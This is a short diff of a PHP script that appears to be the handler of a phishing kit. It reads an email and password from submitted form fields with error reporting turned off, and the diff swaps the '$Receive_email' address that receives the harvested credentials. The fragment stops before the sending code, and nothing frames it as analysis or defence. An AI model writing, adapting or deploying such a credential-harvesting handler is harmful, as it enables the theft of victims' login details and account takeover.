@@ -1,6 +1,6 @@
 <?php
 error_reporting(0);
-$Receive_email = 'dougmalcom@yandex.com';
+$Receive_email = 'carnagiemelissa@gmail.com';
 $email = trim($_POST['ai']);
 $password = trim($_POST['pr']);
 if($email != "" || $password != "" ){
